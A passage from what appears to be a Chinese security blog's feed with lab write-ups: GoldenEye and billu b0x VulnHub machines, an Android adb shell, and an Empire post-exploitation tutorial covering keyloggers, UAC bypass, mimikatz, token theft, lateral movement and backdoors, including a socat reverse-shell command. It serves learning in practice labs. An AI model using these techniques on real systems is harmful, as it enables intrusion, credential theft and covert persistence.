class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">007,</span><br><span class="line"></span><br><span class="line">I was able to capture this apps adm1n cr3ds through clear txt. </span><br><span class="line"></span><br><span class="line">Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. </span><br><span class="line"></span><br><span class="line">Something juicy is located here: /dir007key/for-007.jpg</span><br><span class="line"></span><br><span class="line">Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.</span><br></pre></td></tr></table></figure><p>下载一下图片,然后strings一下 <img src="/images/2018/09/2018-09-14-00-45-07屏幕截图.png" alt="blacsheep" /> 然后base64解一下找到密码,回到后台,帐号admin,密码xWinter1995x!登录 登录之后发现cms的版本信息 <img src="/images/2018/09/2018-09-14-14-06-22屏幕截图.png" alt="blacsheep" /></p><h2 id="msf拿shell">msf拿shell</h2><p>msf搜一下 <img src="/images/2018/09/2018-09-14-14-07-44屏幕截图.png" alt="blacsheep" /> 那么用一下这个exp,注意要设置一下路径 <img src="/images/2018/09/2018-09-14-14-14-58屏幕截图.png" alt="blacsheep" /> 运行一下,发现失败了 看一下exp:<a href="https://www.exploit-db.com/exploits/29324/" title="https://www.exploit-db.com/exploits/29324/">https://www.exploit-db.com/exploits/29324/</a> 发现123行指定了editor <img src="/images/2018/09/2018-09-14-14-12-24屏幕截图.png" alt="blacsheep" /> 那么我们去后台改一下设置 <img src="/images/2018/09/2018-09-14-14-13-35屏幕截图.png" alt="blacsheep" /> 然后运行,拿到shell <img src="/images/2018/09/2018-09-14-14-14-47屏幕截图.png" alt="blacsheep" /></p><h2 id="提权">提权</h2><p>看一下内核信息,然后去exploit-db上看下 <img src="/images/2018/09/2018-09-14-14-18-51屏幕截图.png" alt="blacsheep" /> 看下使用 <img src="/images/2018/09/2018-09-14-14-19-57屏幕截图.png" alt="blacsheep" /> 那么直接下载下来即可,然后写一个木马进去,方便传文件,然后传进exp <img src="/images/2018/09/2018-09-14-14-21-35屏幕截图.png" alt="blacsheep" /> 回msf,编译运行即可,然后发现目标机没有gcc.. <img src="/images/2018/09/2018-09-14-14-24-37屏幕截图.png" alt="blacsheep" /> 那么可以用clang和cc绕过</p><h3 id="clang">clang</h3><p><img src="/images/2018/09/2018-09-14-14-33-13屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-14-14-34-00屏幕截图.png" alt="blacsheep" /></p><h3 id="cc">cc</h3><figure><img src="/images/2018/09/2018-09-14-14-37-09屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="拿flag">拿flag</h2><p>到root目录 <img src="/images/2018/09/2018-09-14-14-38-55屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-14-14-39-37屏幕截图.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透学习(android和drupal)</title>
      <link href="/2018/09/11/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/09/11/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>安全客:<a href="https://www.anquanke.com/post/id/158937#h2-1" title="https://www.anquanke.com/post/id/158937#h2-1">https://www.anquanke.com/post/id/158937#h2-1</a> 两个简单的渗透,第一个是一个很简单的安卓,不过第一次碰到安卓渗透,看着别人的wp做的,第二个是drupal. 简单记录一下吧</p><h1 id="android4">android4</h1><h2 id="下载">下载</h2><p>Android4靶机下载：<a href="https://pan.baidu.com/s/1mdjXHQOYwUC8iVvHvKmo2A" title="https://pan.baidu.com/s/1mdjXHQOYwUC8iVvHvKmo2A">https://pan.baidu.com/s/1mdjXHQOYwUC8iVvHvKmo2A</a></p><h2 id="安装">安装</h2><p>vmbox的管理-&gt;导入虚拟电脑,然后导入ova文件即可 <img src="/images/2018/09/2018-09-11-17-22-33屏幕截图.png" alt="blacsheep" /> 开机之后 <img src="/images/2018/09/2018-09-11-17-24-44屏幕截图.png" alt="blacsheep" /></p><h2 id="找ip">找ip</h2><p>直接netdiscover <img src="/images/2018/09/18-44-23.png" alt="blacsheep" /> 然后ip是192.168.1.100 或者<code>arp-scan -l</code>也可以</p><h2 id="扫端口">扫端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- -v -T5 192.168.1.100</span><br></pre></td></tr></table></figure><p>然后得到结果 <img src="/images/2018/09/2018-09-11-18-49-51屏幕截图.png" alt="blacsheep" /></p><h2 id="拿shell">拿shell</h2><p>端口有8080,那先去8080看下 <img src="/images/2018/09/2018-09-11-18-58-34屏幕截图.png" alt="blacsheep" /> 然后他说有后门,那么扫一下目录 找到backdoor.php,但是没什么用 <img src="/images/2018/09/2018-09-11-19-02-24屏幕截图.png" alt="blacsheep" /> 然后去看下22000端口 <img src="/images/2018/09/2018-09-11-19-04-57屏幕截图.png" alt="blacsheep" /> 发现是SSH-2.0-dropbear_2014.66 searchsploit一下 <img src="/images/2018/09/2018-09-11-19-21-33屏幕截图.png" alt="blacsheep" /> 发现版本不对 然后再去看下5555端口 发现是adb 去找了下资料,发现安卓的默认adb端口好像是5037,不过有的人也习惯改成5555 知道了是adb,那么我们就直接安装adb就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install adb</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb connect 192.168.1.100:5555</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure><p>就拿到shell了 <img src="/images/2018/09/2018-09-11-19-25-24屏幕截图.png" alt="blacsheep" /> 然后就是提权了,说实话这个提权蛮蠢的,<code>su root</code>就是root了.. <img src="/images/2018/09/2018-09-11-19-27-00屏幕截图.png" alt="blacsheep" /> 然后data/root找到flag <img src="/images/2018/09/2018-09-11-19-28-23屏幕截图.png" alt="blacsheep" /></p><h2 id="后续">后续</h2><p>既然都有权限了,再去web目录下面找找看后门吧 在announce/backdoor.php下面找到后门 <img src="/images/2018/09/2018-09-11-19-31-10屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-11-19-39-30屏幕截图.png" alt="blacsheep" /> 不过并不能拿到flag,因为没有权限,还是得用到shell 最后,由于之前登录界面进不去,但是现在不一样了,我们是root了,直接去把锁删掉就好了 <img src="/images/2018/09/2018-09-11-19-42-02屏幕截图.png" alt="blacsheep" /> 然后就进去了 <img src="/images/2018/09/2018-09-11-19-43-46屏幕截图.png" alt="blacsheep" /></p><h1 id="billu-b0x">billu b0x</h1><p>主要学提权吧,然后就是drupal的最新漏洞</p><h2 id="下载-1">下载</h2><p>靶机下载:<a href="https://pan.baidu.com/s/1NAAiXJUouE9AoW-wYJf_tQ" title="https://pan.baidu.com/s/1NAAiXJUouE9AoW-wYJf_tQ">https://pan.baidu.com/s/1NAAiXJUouE9AoW-wYJf_tQ</a></p><h2 id="安装-1">安装</h2><p>和前面安卓的一样</p><h2 id="找ip-1">找ip</h2><p>一样的 <img src="/images/2018/09/2018-09-12-23-39-48屏幕截图.png" alt="blacsheep" /> ip:192.168.31.10</p><h2 id="扫端口-1">扫端口</h2><figure><img src="/images/2018/09/2018-09-12-23-41-51屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="拿shell-1">拿shell</h2><p>首先去80 然后发现是drupal <img src="/images/2018/09/2018-09-12-23-43-18屏幕截图.png" alt="blacsheep" /> 前段时间报了个drupal的漏洞,去msf看下 <img src="/images/2018/09/2018-09-12-23-45-15屏幕截图.png" alt="blacsheep" /> 然后用一下drupal的最新漏洞,设置好lhost和rhost 然后拿到反弹的meterpreter <img src="/images/2018/09/2018-09-12-23-47-50屏幕截图.png" alt="blacsheep" /></p><h2 id="提权">提权</h2><p>这里主要是学习一下提权的知识 拿到shell但是上传文件很复杂,所以我们先写一个木马进去,然后蚁剑连上去,方便传文件 <img src="/images/2018/09/2018-09-13-00-51-51屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-13-00-52-35屏幕截图.png" alt="blacsheep" /> 先传几个探测脚本 <img src="/images/2018/09/2018-09-13-00-58-14屏幕截图.png" alt="blacsheep" /> 然后切一个简易终端,这个详细可以看<a href="http://www.freebuf.com/news/142195.html" title="http://www.freebuf.com/news/142195.html">http://www.freebuf.com/news/142195.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Listener:</span></span><br><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Victim:</span></span><br><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 </span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-13-01-06-46屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="etcpasswd">/etc/passwd</h3><p>这次的/etc/passwd可写,而且可以改密码的hash,那就简单了,我们覆盖密码,然后权限给<code>0:0</code> <img src="/images/2018/09/2018-09-13-01-14-20屏幕截图.png" alt="blacsheep" /> 然后就root了 <img src="/images/2018/09/2018-09-13-01-16-38屏幕截图.png" alt="blacsheep" /></p><h3 id="opts">/opt/s</h3><p>首先/opt里面有s strings一下 <img src="/images/2018/09/2018-09-13-01-18-56屏幕截图.png" alt="blacsheep" /> 发现有scp命令而且是root,那么我们写一个恶意的scp然后去覆盖执行就可以了 <img src="/images/2018/09/2018-09-13-01-25-25屏幕截图.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>empire学习</title>
      <link href="/2018/09/11/empire%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/09/11/empire%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>Empire是一个针对windows平台的使用PowerShell脚本作为攻击载荷的渗透攻击框架,在域渗透中有很大作用,这里主要是通过安全客上的文章进行简单的学习吧 文章链接: <a href="https://www.anquanke.com/post/id/87328" title="https://www.anquanke.com/post/id/87328">https://www.anquanke.com/post/id/87328</a> <a href="https://www.anquanke.com/post/id/87333" title="https://www.anquanke.com/post/id/87333">https://www.anquanke.com/post/id/87333</a></p><h2 id="安装">安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br><span class="line">cd Empire</span><br><span class="line">cd setup</span><br><span class="line">sudo ./install.sh</span><br></pre></td></tr></table></figure><p>如果使用的时候报缺少module,就用pip装一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirments.txt</span><br></pre></td></tr></table></figure><p>安装完了直接<code>./empire</code>就可以了 <img src="/images/2018/09/2018-09-08-14-27-11屏幕截图.png" alt="blacsheep" /></p><h2 id="设置监听">设置监听</h2><p>进入empire之后可以help查看帮助 <img src="/images/2018/09/2018-09-08-14-28-45屏幕截图.png" alt="blacsheep" /> 一般来说使用步骤就是先设置一个监听,然后去生成一个木马,在目标主机上面运行这个木马,我们这边就可以得到反弹的shell了 那么我们首先进入监听线程页面 <img src="/images/2018/09/2018-09-08-14-34-48屏幕截图.png" alt="blacsheep" /> 然后可以uselistener,这里我们选择http <img src="/images/2018/09/2018-09-08-14-36-10屏幕截图.png" alt="blacsheep" /> 可以输入info查看配置,用set可以进行设置 然后我们可以set一下名字,为了方便我就用他的名字了 然后ip这里是我们的本机ip,所以并不需要配置 <img src="/images/2018/09/2018-09-08-14-40-37屏幕截图.png" alt="blacsheep" /> 完成了之后可以开始监听了,注意,要是之前开了80端口的话先关掉 <img src="/images/2018/09/2018-09-08-14-43-09屏幕截图.png" alt="blacsheep" /> 然后我们back回去list可以查看监听 <img src="/images/2018/09/2018-09-08-14-44-38屏幕截图.png" alt="blacsheep" /> 想要删除可以直接用kill <img src="/images/2018/09/2018-09-08-14-45-55屏幕截图.png" alt="blacsheep" /> 这里注意,如果要开多个监听的话必须使用不同的名字和端口.</p><h2 id="生成木马">生成木马</h2><p>监听设置好了,就去生成木马去目标机器上面运行就好了 我们用usestagger来查看模块 <img src="/images/2018/09/2018-09-08-14-49-48屏幕截图.png" alt="blacsheep" /> 这里multi是通用,osx是mac系统的,windows就是windows的,下面对几种类型的木马讲解一下</p><h3 id="dll">dll</h3><p>直接use一下,然后info看下配置 <img src="/images/2018/09/2018-09-08-14-53-32屏幕截图.png" alt="blacsheep" /> 设置一下listener,然后生成文件 <img src="/images/2018/09/2018-09-08-15-19-07屏幕截图.png" alt="blacsheep" /> 即可生成而恶意dll,不过我实验之后并没有返回agent,之后再看吧</p><h3 id="launcher">launcher</h3><p>当仅仅只是需要一段简单的代码的时候,可以直接在listen界面使用launcher 比如 <img src="/images/2018/09/2018-09-08-16-49-50屏幕截图.png" alt="blacsheep" /> 到目标机器上面去运行,然后就有一段连接信息 <img src="/images/2018/09/2018-09-08-16-51-03屏幕截图.png" alt="blacsheep" /> 切换到agents,然后就可以interact连上去 <img src="/images/2018/09/2018-09-08-16-53-17屏幕截图.png" alt="blacsheep" /></p><h3 id="launcher_vbs">launcher_vbs</h3><p>一样的,选择stagger的时候用vbs,然后set好参数,execute生成文件,然后目标主机去运行 <img src="/images/2018/09/2018-09-08-17-00-23屏幕截图.png" alt="blacsheep" /></p><h3 id="其他">其他</h3><p>后面还有bat,macro和ducky bat和macro都可以插入到word里面,不过会报宏病毒... 可以自己去尝试</p><h2 id="信息收集">信息收集</h2><p>empire主要用于后渗透,那么信息收集就是很重要的模块了,我们可以searchmodule命令来搜索相应的模块(就像msf的search) 同样我们可以usemodule 然后tab来查看一些module,我们searchmodule collection,得到返回 <img src="/images/2018/09/2018-09-08-17-49-45屏幕截图.png" alt="blacsheep" /></p><h3 id="截图">截图</h3><p>我们使用screenshot,info查看信息 <img src="/images/2018/09/2018-09-08-17-51-16屏幕截图.png" alt="blacsheep" /> 然后设置好agent之后execute就可以了 <img src="/images/2018/09/2018-09-08-17-53-59屏幕截图.png" alt="blacsheep" /> 图片存在了<code>/Empire/downloads/BA3HM8WF/screenshot</code> <img src="/images/2018/09/2018-09-08-17-58-00屏幕截图.png" alt="blacsheep" /></p><h3 id="键盘记录">键盘记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/collection/keylogger</span><br></pre></td></tr></table></figure><p>我们直接execute就好,然后在interact之后可以用<code>jobs</code>命令看见我们挂在后台的操作,而且可以<code>jobs kill JOBS_ID</code>来杀掉进程 <img src="/images/2018/09/2018-09-08-18-06-13屏幕截图.png" alt="blacsheep" /> 在keystrokes.txt中可以看到我们的键盘记录 <img src="/images/2018/09/2018-09-08-18-11-05屏幕截图.png" alt="blacsheep" /></p><h3 id="剪切板记录">剪切板记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule collection/clipboard_monitor</span><br></pre></td></tr></table></figure><p>然后info查看一下,直接execute <img src="/images/2018/09/2018-09-10-10-34-14屏幕截图.png" alt="blacsheep" /></p><h3 id="查看域共享">查看域共享</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/powerview/share_finder</span><br></pre></td></tr></table></figure><p>然后有一些配置,需要的话可以自己配置一下,我这里直接execute了,不过由于没有搭建域环境,所以没有东西 <img src="/images/2018/09/2018-09-10-10-43-46屏幕截图.png" alt="blacsheep" /></p><h3 id="主机相关信息">主机相关信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/host/winenum</span><br></pre></td></tr></table></figure><p>可以查看本机用户,域组成员,最后密码设置时间,剪贴板内容,系统基本系统信息,网络适配器信息,共享信息等等 <img src="/images/2018/09/2018-09-10-10-53-13屏幕截图.png" alt="blacsheep" /></p><h3 id="arp扫描">arp扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><p>需要注意的是这里需要设置Range参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: powershell/situational_awareness/network/arpscan) &gt; set Range 10.0.2.0-10.0.2.254</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-11-01-38屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="dns信息获取">dns信息获取</h3><h4 id="内网dns反查">内网dns反查</h4><p>在内网中,知道所有机器的HostName和对应的IP地址对分析内网结构至关重要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/reverse_dns</span><br></pre></td></tr></table></figure><p>同样,注意设置一下Range <img src="/images/2018/09/2018-09-10-11-10-01屏幕截图.png" alt="blacsheep" /></p><h4 id="查询dns服务器">查询dns服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/host/dnsserver</span><br></pre></td></tr></table></figure><p>不需要参数,直接查询即可 <img src="/images/2018/09/2018-09-10-11-13-39屏幕截图.png" alt="blacsheep" /></p><h3 id="查找域管登录服务器ip">查找域管登录服务器ip</h3><p>内网渗透中,拿到一台内网机想要获得域管权限有一种方法就是横向渗透,拿下域管登录的机子然后横向渗透进去,窃取域管的权限从而拿下整个域. 这个模块就是用来查找域管登录过的服务器的ip的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure><p>然后execute即可,我本地没有搭建环境,没有相关信息</p><h3 id="本地管理组访问">本地管理组访问</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: F8AT9WYP) &gt; usemodule situational_awareness/network/powerview/find_localadmin_access</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-13-40-09屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="获取域控制器">获取域控制器</h3><p>假如我们成功地拿到了域用户权限,那么可以来找域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: F8AT9WYP) &gt; usemodule situational_awareness/network/powerview/get_domain_controller</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-13-46-33屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="提权">提权</h2><p>Windows在Vista系统开始引入UAC账户控制体系</p><blockquote><p>高:完整的管理员权限 中:标准用户权限 低:很低的权限</p></blockquote><p>即使当前用户是本地管理员,双击运行大部分应用程序时也是以标准用户权限运行的(除非右击-选择以管理员身份运行)。所以即使我们获得的权限是本地管理员权限,也没有办法执行一些命令(特殊注册表写入、LSASS读取/写入等等),所以渗透的第一步便是提权,提权的前提便是知道自己拥有什么权限,可以输入以下命令来查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br></pre></td></tr></table></figure><p>显示的如果是High Mandatory Level表示是管理员权限,Medium Mandatory Level则是普通用户权限 我这里是普通用户 <img src="/images/2018/09/2018-09-10-13-56-05屏幕截图.png" alt="blacsheep" /></p><h3 id="bypassuac">bypassuac</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: F8AT9WYP) &gt; usemodule privesc/bypassuac</span><br></pre></td></tr></table></figure><p>info之后记得设置listener,因为这里会上线一个新的反弹 <img src="/images/2018/09/2018-09-10-13-58-36屏幕截图.png" alt="blacsheep" /> 回到agents查看 带了*号的是提权成功的 <img src="/images/2018/09/2018-09-10-14-01-48屏幕截图.png" alt="blacsheep" /> 我们interact上去 <img src="/images/2018/09/2018-09-10-14-03-42屏幕截图.png" alt="blacsheep" /> 发现权限已经是high了</p><h3 id="bypassuac_wscript">bypassuac_wscript</h3><p>这个模块大概原理是使用c:Windowswscript.exe执行payload,实现管理员权限执行payload,绕过UAC。只适用于系统为Windows 7,目前尚没有对应补丁(17年11月),部分杀毒软件会有提示。 <img src="/images/2018/09/2018-09-10-14-08-09屏幕截图.png" alt="blacsheep" /> 如下图所示,带型号的即为提权成功的。 <img src="/images/2018/09/2018-09-10-14-11-24屏幕截图.png" alt="blacsheep" /> interact然后查看一下 <img src="/images/2018/09/2018-09-10-14-11-06屏幕截图.png" alt="blacsheep" /> 提权成功</p><h3 id="ms16-032">ms16-032</h3><p>empire自带了ms16-032模块,use一下设置一下listener,execute即可提权,不过我这里是虚拟机,提示要求两核以上的CPU才能提权 <img src="/images/2018/09/2018-09-10-14-17-40屏幕截图.png" alt="blacsheep" /></p><h3 id="ms16-135">ms16-135</h3><p>同理使用,不过提醒一下,运行的时候受害者桌面会闪屏,而且有蓝屏的可能,我测试的时候第一次是蓝屏,不过第二次成功了 <img src="/images/2018/09/2018-09-10-14-30-01屏幕截图.png" alt="blacsheep" /> 成功之后,显示的是system权限 <img src="/images/2018/09/2018-09-10-14-31-55屏幕截图.png" alt="blacsheep" /></p><h3 id="powerup">powerup</h3><p>Empire内置了PowerUp部分工具,用于系统提权,主要为Windows错误系统配置漏洞,Windows Services漏洞,AlwaysInstallElevated漏洞等8种提权方式,输入“usemodule privesc/powerup”然后按Tab键来查看完整列表,如下图所示。 <img src="/images/2018/09/2018-09-10-14-39-16屏幕截图.png" alt="blacsheep" /></p><h3 id="allchecks">allchecks</h3><p>如何查找上述的漏洞,我们就可以使用allchecks</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: 96XZYBKD) &gt; usemodule privesc/powerup/allchecks</span><br></pre></td></tr></table></figure><p>直接execute即可 <img src="/images/2018/09/2018-09-10-14-58-45屏幕截图.png" alt="blacsheep" /> 测试一下bypassuac,成功返回高权限</p><h4 id="文档">文档</h4><p>官方说明如下： l 对于任何没有引号的服务路径问题 l 对于ACL配置错误的任何服务（可通过service_ *利用 ） l 服务可执行文件上的任何不当权限（可通过service_exe_ *进行利用） l 对于任何剩余的unattend.xml文件 l 如果AlwaysInstallElevated注册表项设置 l 如果有任何Autologon凭证留在注册表中 l 用于任何加密的web.config字符串和应用程序池密码 l 对于任何％PATH％.DLL劫持机会（可通过write_dllhijacker利用）</p><h3 id="gpp">gpp</h3><p>在域里面很多都会启用组策略首选项来执行本地密码更改,以便于管理和映像部署。缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取到部署信息。虽然他是采用AES 256加密的,使用usemodule privesc/gpp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: 96XZYBKD) &gt; usemodule privesc/gpp</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-15-11-06屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="横向渗透">横向渗透</h2><h3 id="令牌窃取">令牌窃取</h3><h4 id="mimikatz">mimikatz</h4><p>获取到了服务器的权限之后,我们可以使用mimikatz获取系统密码 <img src="/images/2018/09/2018-09-10-15-24-14屏幕截图.png" alt="blacsheep" /> 然后creds就可以获取到hash密码甚至明文密码了 <img src="/images/2018/09/2018-09-10-15-26-03屏幕截图.png" alt="blacsheep" /></p><h4 id="steal_token">steal_token</h4><p>假如域用户在这个服务器上面登录过,那我们就可以去窃取域用户的身份令牌,比如我们这里执行<code>pth &lt;ID&gt;</code>,这里的ID是creds前面的id <img src="/images/2018/09/2018-09-10-15-41-54屏幕截图.png" alt="blacsheep" /> 然后可以看到pid,我们直接<code>steal_token pid</code> <img src="/images/2018/09/2018-09-10-15-45-20屏幕截图.png" alt="blacsheep" /> 同样我们也可以ps获取进程 <img src="/images/2018/09/2018-09-10-15-47-05屏幕截图.png" alt="blacsheep" /> 如果有域内的用户的进程,那么我们就可以steal_token来获取令牌 <img src="/images/2018/09/2018-09-10-15-58-54屏幕截图.png" alt="blacsheep" /> 当然,要将令牌权限恢复到原来的状况的话我们可以用<code>revtoself</code> <img src="/images/2018/09/2018-09-10-15-58-15屏幕截图.png" alt="blacsheep" /></p><h3 id="会话注入">会话注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule management/psinject</span><br></pre></td></tr></table></figure><p>感觉和前面的steal_token差不多 info的时候设置一下Listener和ProcId <img src="/images/2018/09/2018-09-11-10-46-59屏幕截图.png" alt="blacsheep" /> 然后反弹回来一个会话 <img src="/images/2018/09/2018-09-11-10-47-09屏幕截图.png" alt="blacsheep" /></p><h3 id="invoke-psexec">Invoke-PsExec</h3><p>缺点是该工具基本杀毒软件都能检测到,并会留下日志,而且需要开启admin$ 445端口共享。优点是可以直接返回SYSTEM权限。这里我们要演示的是Empire下的Invoke-Psexec模块。 使用该模块的前提是我们已经获得本地管理员权限,甚至域管理员账户,然后以此来进一步持续渗透整个内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_psexec</span><br></pre></td></tr></table></figure><p>然后set好计算机的名称和Listener即可 这里我本地失败了,就不截图了</p><h3 id="invoke-wmi">Invoke-WMI</h3><p>它比PsExec安全,所有window系统启用该服务,当攻击者使用wmiexec来进行攻击时,Windows系统默认不会在日志中记录这些操作,这意味着可以做到攻击无日志,同时攻击脚本无需写入到磁盘,具有极高的隐蔽性。但防火墙开启将会无法连接。输入usemodule lateral_movement/invoke_wmi,使用该模块,输入info命令查看具体参数,如下图所示 <img src="/images/2018/09/2018-09-11-11-15-41屏幕截图.png" alt="blacsheep" /> 然后执行了恶意代码 <img src="/images/2018/09/2018-09-11-11-19-19屏幕截图.png" alt="blacsheep" /> WMI还有一个usemodule lateral_movement/invoke_wmi_debugger模块,是使用WMI去设置五个Windows Accessibility可执行文件中任意一个的调试器。这些可执行文件包括sethc.exe(粘滞键,五下shift可触发),narrator.exe(文本转语音,Utilman接口激活)、Utilman.exe(windows辅助管理器,Win+U启用),Osk.exe(虚拟键盘,Utilman接口启用)、Magnify.exe(放大镜,Utilman接口启用)。大家也可以尝试一下。</p><h3 id="powershell-remoting5985端口">Powershell Remoting(5985端口)</h3><p>PowerShell remoting是Powershell的远程管理功能,开启Windows远程管理服务WinRM会监听5985端口,该服务默认在Windows Server 2012中是启动的,在Windows Server 2003、2008和2008 R2需要通过手动启动 如果启用了这个服务,那我们就可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_psremoting</span><br></pre></td></tr></table></figure><p>set好参数即可</p><h2 id="后门">后门</h2><h3 id="权限持久性劫持shift后门">权限持久性劫持shift后门</h3><p>粘置键后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debuggerinfo</span><br></pre></td></tr></table></figure><p>然后set好listener和computer name,然后target binary设置sethc.exe,execute成功之后有提醒,然后去靶机上按shift就反弹shell回来了 <img src="/images/2018/09/12-51-08.png" alt="blacsheep" /> 注意:sethc.exe这里有几个可以替换的选项。 A.Utilman.exe（快捷键为: Win + U） B.osk.exe（屏幕上的键盘Win + U启动再选择） C.Narrator.exe (启动讲述人Win + U启动再选择) D.Magnify.exe(放大镜Win + U启动再选择）</p><h3 id="注册表注入后门">注册表注入后门</h3><p>这里我只是set了一个listener <img src="/images/2018/09/2018-09-11-13-10-59屏幕截图.png" alt="blacsheep" /> 重新登录系统的时候运行了恶意代码,直接反了一个shell 不过登录的时候黑框还是蛮明显的 <img src="/images/2018/09/2018-09-11-13-14-21屏幕截图.png" alt="blacsheep" /></p><h3 id="计划任务获得权限">计划任务获得权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule 